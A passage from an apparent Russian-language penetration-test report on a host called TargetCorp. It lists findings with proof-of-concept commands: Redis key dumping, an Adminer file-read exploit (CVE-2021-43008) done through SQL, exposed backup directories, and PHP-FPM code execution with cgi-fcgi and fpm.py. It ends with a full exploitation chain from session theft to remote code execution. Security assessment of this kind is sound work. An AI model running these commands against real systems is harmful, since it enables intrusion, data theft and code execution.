  Порт: 8080
- **PHP-FPM 8.1.2**
  Порт: 9000

  Порт: 80
# Технические детали
## Неаутентифицированный доступ к Redis
### Описание
В сервисе не предусмотрены меры аутентификации к хранилищу Redis.
### Риск
- Чтение, изменение или удаление данных.
- Кража конфиденциальной информации.
- Компрометация смежных систем.
- Выполнение произвольного кода.
### PoC
1) Подключаемся к Redis: `redis-cli -h 2.12.85.6`
2) Запрашиваем все пары ключ-значение: `KEYS *`
3) Получаем данные:
	```bash
	1) "session:admin:9f3a2b"
	2) "config:database"
	3) "cache:page:main"
	```
## Использование уязвимого компонента Adminer (CVE-2021-43008)
### Описание
Используется компонент **Adminer** версии **4.6.1**, который является уязвимым.

**CVE-2021-43008** - некорректный контроль доступа в версиях Adminer от 1.12.0 до 4.6.2 (исправлено в версии 4.6.3) позволяет злоумышленнику осуществлять произвольное чтение файлов на удаленном сервере, запрашивая у Adminer подключение к удаленной базе данных MySQL.
### Риск
- Произвольное чтение файлов на сервере.
### PoC
1) Аутентифицироваться в Adminer
2) Создать таблицу, если ее нет:
	```sql
	CREATE TABLE lfr_sink_table (line TEXT);
	```
3) Загрузить желаемый для просмотра файл в таблицу:
	```sql
	TRUNCATE lfr_sink_table;
	LOAD DATA LOCAL INFILE '/path/to/file' INTO TABLE lfr_sink_table FIELDS TERMINATED BY "\n";
	```
4) Прочитать данные, в которых будет содержимое файла:
	```sql
	SELECT * FROM lfr_sink_table;
	```
## Открытые критичные директории
### Описание
Приложение не контролирует доступ к директориями `/admin/` и `/backup/`. К тому же, их наличие раскрывает служебный файл `robots.txt`.
### Риск
Получение доступа к чувствительным ресурсам и файлам (например к файлам **дампа БД** и **конфигурации сайта**).
### PoC
1) Выполняем GET-запрос на `http://2.12.85.6/robots.txt`.
2) Получаем
	```
	User-agent: *
	Disallow: /admin/
	Disallow: /backup/ 
	```
3) Делаем GET-запрос, например, на `http://2.12.85.6/backup/`.
4) Получаем открытый доступ к директории, в которой находятся **дамп БД** и **конфигурация сайта**.
## Открытый, неаутентифицированный доступ к PHP-FPM
### Описание
**PHP-FPM (PHP FastCGI Process Manager)** - это реализация интерфейса FastCGI для PHP, предназначенная для эффективной и безопасной обработки PHP-скриптов, особенно на высоконагруженных сайтах.

Для PHP-FPM **не подразумевается** доступ из интернета.
### Риск
- Выполнение произвольного кода
### PoC
- Запуск существующего скрипта через утилиту `cgi-fcgi`:
	```bash
	SCRIPT_FILENAME=/var/www/html/index.php \
	REQUEST_METHOD=GET \
	cgi-fcgi -bind -connect 2.12.85.6:9000
	```
- Для запуска произвольного кода можно использовать, например, код `fpm.py` от phith0n: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75.
  Например:
	```bash
	python fpm.py 2.12.85.6 /var/www/html/index.php -c "<?php system('id'); ?>"
	```
## Использование уязвимого компонента OpenSSH (CVE-2024-6387)
### Описание
Используется компонент OpenSSH версии 8.9p1, который является уязвимым.

**CVE-2024-6387** (regreSSHion) - это критическая уязвимость удаленного выполнения кода в OpenSSH 8.5p1-9.7p1.
Уязвимость возникает из-за небезопасного управления памятью в уязвимом компоненте.

При выполнении атакующим ряда условий, с **некоторой (достаточно небольшой)** вероятностью это вызывает состояние гонки, приводящее к нарушению границ памяти и выполнению произвольного кода.
### Ограничения
Для того чтобы проэксплуатировать уязвимость, атакующий должен совершить в среднем 10 тысяч попыток аутентификации, а атакуемая система должна быть построена на базе версий Linux, использующих библиотеку Gnu C (glibc).
### Риск
- Удаленное выполнение кода
# Цепочка эксплуатации
## Захват аккаунта -> LFI -> RCE
1) С помощью Redis читаем ключи:
	```bash
	redis-cli -h 2.12.85.6
	KEYS *
	```
2) Крадем сессию админа
3) Получаем доступ к основному ресурсу TargetCorp к закрытой директории `2.12.85.6:80/admin/`
4) Скачиваем бэкапы БД и конфигурацию из `2.12.85.6:80/backup/`
5) Входим в Adminer и эксплуатируем CVE-2021-43008 для чтения любых файлов на сервере
6) Убеждаемся в наличии какого-то PHP файла на сервере, например `/var/www/html/index.php`
7) Используем скрипт `fpm.py` для выполнение произвольного PHP-кода
